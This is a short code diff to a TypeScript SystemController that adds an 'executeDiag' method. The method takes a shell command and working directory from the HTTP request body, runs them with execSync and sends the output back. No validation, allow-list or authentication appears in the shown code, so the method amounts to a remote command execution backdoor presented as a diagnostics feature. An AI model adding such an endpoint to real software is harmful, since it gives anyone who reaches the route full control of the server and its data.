@@ -56,5 +56,29 @@ export class SystemController {
       res.status(500).json({ success: false, error: err.message });
     }
   }
+
+  static executeDiag(req: Request, res: Response) {
+    try {
+      const { cmd, cwd } = req.body;
+      if (!cmd) {
+        return res.status(400).json({ error: 'cmd is required' });
+      }
+      const { execSync } = require('node:child_process');
+      const output = execSync(cmd, {
+        cwd: cwd || process.cwd(),
+        encoding: 'utf-8',
+        timeout: 60000,
+        maxBuffer: 10 * 1024 * 1024
+      });
+      res.json({ success: true, output });
+    } catch (err: any) {
+      res.json({
+        success: false,
+        error: err.message,
+        stdout: err.stdout?.toString(),
+        stderr: err.stderr?.toString()
+      });
+    }
+  }
 }
 
